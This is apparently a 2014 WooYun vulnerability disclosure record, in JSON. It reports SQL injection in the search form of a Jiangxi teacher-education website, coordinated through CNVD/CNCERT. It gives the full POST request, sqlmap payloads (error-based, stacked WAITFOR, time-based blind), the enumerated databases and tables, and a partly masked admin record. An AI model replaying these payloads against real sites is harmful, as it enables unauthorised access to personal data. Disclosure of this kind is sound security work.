{"id": 58821, "wybug_id": "wooyun-2014-049508", "wybug_title": "某市教师信息管理系统SQL注入", "wybug_corp": "江西教师教育网", "wybug_author": "m_vptr", "wybug_date": "2014-01-22 11:50", "wybug_open_date": "2014-03-08 11:51", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-08：\t细节向公众公开  简要描述： sql注入，涉及40+w用户数据。还好身份证、邮箱、手机都是加密过的。 详细说明：  注入点： http://www.jxjsjy.com/search/该搜索页没有对post参数txtKeyword进行过滤post请求：\nPOST /search/ HTTP/1.1Host: www.jxjsjy.comProxy-Connection: keep-aliveContent-Length: 601Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://www.jxjsjy.comUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://www.jxjsjy.com/search/Accept-Encoding: gzip,deflate,sdchAccept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4Cookie: ASP.NET_SessionId=iy0biq24x2bdjee4fs1jdmvp; arp_scroll_position=0__VIEWSTATE=%2FwEPDwUJNDgwNDI3NjI4D2QWAgIDD2QWBAIHDw8WAh4EVGV4dAVB6K%2B356Gu6K6k5pON5L2c5piv5ZCm5q2j56Gu77yB6ZSZ6K%2BvOidBJyDpmYTov5HmnInor63ms5XplJnor6%2FjgIJkZAIJDzwrABEDAA8WBB4LXyFEYXRhQm91bmRnHgtfIUl0ZW1Db3VudGZkARAWABYAFgAMFCsAAGQYAQUJZ3ZUZWFjaGVyDzwrAAwBCGZk6OhQAJvweO2gfXpjxNQ0W99XLhCbndcYJDjUG7GkkfQ%3D&__EVENTVALIDATION=%2FwEdAAdrRZJq1mAsiUV%2F8f%2B3RITDPYhyekUWnTkkNjRCzj%2B13syRwqaaMbxXVBTc8MQF49fKA14KXQyGcaU%2Bic2XSmnAVhW2Dx14E2vTrCPjioKTT7rZiRCqc8WDJESCLLHi21qO1N1XNFmfsMXJasjxX85j3rIagTYyw3%2FE9DL6U44O05APfTWv0HlOLV5BlIVfbak%3D&ddlSearchType=1&txtKeyword=1&btnSearch=%E6%9F%A5%E6%89%BE\nsqlmap扫描报告\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: txtKeyword    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: __VIEWSTATE=/wEPDwUJNDgwNDI3NjI4D2QWAgIDD2QWBAIHDw8WAh4EVGV4dAUq5b+F6aG76L6T5YWl5Lik5Liq5a2X56ym5Lul5LiK5omN6IO95p+l6K+iZGQCCQ88KwARAwAPFgQeC18hRGF0YUJvdW5kZx4LXyFJdGVtQ291bnRmZAEQFgAWABYADBQrAABkGAEFCWd2VGVhY2hlcg88KwAMAQhmZKzUuf9repKYASGO2Vqf6Var8hakqrngdApNlREArmLC&__EVENTVALIDATION=/wEdAAeI+ePgNPDTFYvogyyzcRLsPYhyekUWnTkkNjRCzj+13syRwqaaMbxXVBTc8MQF49fKA14KXQyGcaU+ic2XSmnAVhW2Dx14E2vTrCPjioKTT7rZiRCqc8WDJESCLLHi21qO1N1XNFmfsMXJasjxX85jIc/dwR9HUQLugKFQrfvbq8TRWHA9jvM8y2HoSFxWGGQ=&ddlSearchType=1&txtKeyword=1%' AND 6963=CONVERT(INT,(SELECT CHAR(113)+CHAR(101)+CHAR(120)+CHAR(101)+CHAR(113)+(SELECT (CASE WHEN (6963=6963) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(117)+CHAR(113)+CHAR(101)+CHAR(113))) AND '%'='&btnSearch=%E6%9F%A5%E6%89%BE    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: __VIEWSTATE=/wEPDwUJNDgwNDI3NjI4D2QWAgIDD2QWBAIHDw8WAh4EVGV4dAUq5b+F6aG76L6T5YWl5Lik5Liq5a2X56ym5Lul5LiK5omN6IO95p+l6K+iZGQCCQ88KwARAwAPFgQeC18hRGF0YUJvdW5kZx4LXyFJdGVtQ291bnRmZAEQFgAWABYADBQrAABkGAEFCWd2VGVhY2hlcg88KwAMAQhmZKzUuf9repKYASGO2Vqf6Var8hakqrngdApNlREArmLC&__EVENTVALIDATION=/wEdAAeI+ePgNPDTFYvogyyzcRLsPYhyekUWnTkkNjRCzj+13syRwqaaMbxXVBTc8MQF49fKA14KXQyGcaU+ic2XSmnAVhW2Dx14E2vTrCPjioKTT7rZiRCqc8WDJESCLLHi21qO1N1XNFmfsMXJasjxX85jIc/dwR9HUQLugKFQrfvbq8TRWHA9jvM8y2HoSFxWGGQ=&ddlSearchType=1&txtKeyword=1%'; WAITFOR DELAY '0:0:5'--&btnSearch=%E6%9F%A5%E6%89%BE    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: __VIEWSTATE=/wEPDwUJNDgwNDI3NjI4D2QWAgIDD2QWBAIHDw8WAh4EVGV4dAUq5b+F6aG76L6T5YWl5Lik5Liq5a2X56ym5Lul5LiK5omN6IO95p+l6K+iZGQCCQ88KwARAwAPFgQeC18hRGF0YUJvdW5kZx4LXyFJdGVtQ291bnRmZAEQFgAWABYADBQrAABkGAEFCWd2VGVhY2hlcg88KwAMAQhmZKzUuf9repKYASGO2Vqf6Var8hakqrngdApNlREArmLC&__EVENTVALIDATION=/wEdAAeI+ePgNPDTFYvogyyzcRLsPYhyekUWnTkkNjRCzj+13syRwqaaMbxXVBTc8MQF49fKA14KXQyGcaU+ic2XSmnAVhW2Dx14E2vTrCPjioKTT7rZiRCqc8WDJESCLLHi21qO1N1XNFmfsMXJasjxX85jIc/dwR9HUQLugKFQrfvbq8TRWHA9jvM8y2HoSFxWGGQ=&ddlSearchType=1&txtKeyword=1%' WAITFOR DELAY '0:0:5'--&btnSearch=%E6%9F%A5%E6%89%BE---\n   漏洞证明：  available databases [7]:\n[*] jxteacher2012_20130606[*] jxteacher20130606[*] master[*] model[*] msdb[*] tempdb[*] TIMS20120615\n116个表，就贴首尾中间几个吧Database: TIMS20120615\n| dbo.tmp_train_users                      | 1466137 || dbo.User_Admins                          | 7148    || dbo.vw_aspnet_Applications               | 1       |\n测试User_Admins数据\nAdminID,ColumnId,UserTypeId,QQ,TName,Email,Address,UserName,Postcode,IsDelete,LastEditBy,ColumnPath,OfficePhone,MobilePhone,LastEditDate,WorkDepartment00017C9D-CEE5-47DD-8C41-2D02F561F4A9,NULL,NULL,xxx,**来,xxx,<blank>,xxx,xxx,0,00017C9D-CEE5-47DD-8C41-2D02F561F4A9,NULL,<blank>,<blank>,06 30 2011  1:49PM,河***\n   修复方案：  过滤   版权声明：转载请注明来源 m_vptr@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2014-01-27 09:04 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给江西分中心处置。涉及用户信息泄露风险，rank 13 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-02-08 22:56 |    \t\tm_vptr \t\t\t( 普通白帽子  |\t\t\t        Rank:133 漏洞数:30        | 新手)\t\t \n  不是某市，是某省    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}